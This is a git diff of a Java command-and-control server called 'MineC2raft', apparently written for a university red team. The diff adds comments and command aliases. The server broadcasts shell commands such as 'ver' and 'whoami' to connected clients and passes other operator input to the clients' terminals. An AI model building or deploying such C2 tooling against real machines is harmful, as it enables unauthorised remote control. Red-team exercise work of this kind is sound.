@@ -5,6 +5,11 @@ import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.concurrent.CopyOnWriteArrayList;
 
+/**@author Austin Hall
+ * Main server class that handles communication between multiple clients using the Client class.
+ * Utilizes the ClientHandler class to offload some work between threads, and makes this class easier to read.
+ * CHATGPT was used as a LEARNING TOOL in the creation of this software.
+ */
 public class Server {
 
     //Escape codes or sommn for different colors. 
@@ -13,20 +18,27 @@ public class Server {
     private static final String YELLOW = "\u001B[33m";
     private static final String RESET = "\u001B[0m";
     
-    private static final double VERSION_NUM = 0.02;
-
+    
+    private static final double VERSION_NUM = 0.02; //version number (change when I feel cheeky ;)
+    private static final CopyOnWriteArrayList<ClientHandler> clients = new CopyOnWriteArrayList<>(); // array of clients as threads.
 
     private ServerSocket serverSocket; //UDP socket
-    private static final CopyOnWriteArrayList<ClientHandler> clients = new CopyOnWriteArrayList<>();
 
-
-
-    public Server() throws IOException{
-        serverSocket = new ServerSocket(50000);
-
+    /**
+     * Creates a new Server object. please only make one of these bc idk what would happen if more than one is open...
+     */
+    public Server(){
+        try {
+            serverSocket = new ServerSocket(50000);
+        } catch(IOException e) {
+            System.out.println("Creation of server Failed.");
+        }
     } 
     
-
+    /**
+     * runs all of the code relating to client / server communication, and handles user input for commands.
+     * @throws IOException
+     */
     public void runServer() throws IOException {
         System.out.println(GREEN + "Server Created. Listening for clients..." + RESET);
 
@@ -47,33 +59,35 @@ public class Server {
         });
         connectionThread.start();
 
-
-        // Other thread will read server terminal until quit.
+        // Start user input listening.
         BufferedReader userReader = new BufferedReader(new InputStreamReader(System.in));
         String userIn = "";
         System.out.println(YELLOW + "Type 'coms' for a list of commands." + RESET);
 
         while((userIn = userReader.readLine()) != null && !userIn.equals("quit")) {
             
-            commandHandler(userIn, null);
+            commandHandler(userIn);
         }
-        System.out.println(clients.toString());
     }    
 
-    
-    public static void commandHandler(String cmd, ClientHandler clientHandler) {
+    /**
+     * Method that helps runServer() interpret user commands. 
+     * Some special commands have been added for ease of use, and any non-special commands will be interpreted through the client's terminal.
+     * @param cmd - the user input.
+     */
+    public static void commandHandler(String cmd) {
         String reply;
         System.out.println(GREEN + "Start of broadcast: " + RESET + "\n");
             switch(cmd) {
-                case "os":
+                case "os", "version":
                     reply = "ver";
                     broadcast(reply, null);
                     break;
-                case "user":
+                case "user", "client":
                     reply = "whoami";
                     broadcast(reply, null);
                     break;
-                case "coms": 
+                case "coms", "commands", "cmd", "cmds": 
                     reply = "               ********** MineC2raft Commands ***********\n\t\t" 
                                 + "os: prints the os of the client.\n\t\t"
                                 + "user: prints the name of the client.\n\t\t" 
@@ -90,7 +104,7 @@ public class Server {
                         System.out.println(i + ": Poop");
                     }
                     break;
-                case "about":
+                case "about", "abt":
                     reply = "\n░▒▓ MINEC2RAFT ▓▒░\n" 
                             + "Version: " + VERSION_NUM 
                             + "\nWritten by Austin Hall for RIT's Red Team.\n" 
@@ -98,7 +112,7 @@ public class Server {
                             + "A dud?\n/give @p minecraft:command_block";
                     System.out.println(reply);
                     break;
-                case "sockets":
+                case "sockets", "clients":
                     System.out.println("Current Connected clients: "+ clients.toString()); // Fix this so that it gives socket numbers
                     System.out.println("\n" + "\u001B[31m" + "End of Command." + "\u001B[0m");
                     break;                
@@ -109,6 +123,9 @@ public class Server {
         
     }
 
+    /** 
+     * Broadcasts commands to all clients - if the message does not have "CMD: " at the start, the client WILL NOT interpret the message.
+     */
     public static void broadcast(String msg, ClientHandler sender) {
 
         if(msg == null || msg.trim().isEmpty() || msg.equals("__END__")) {
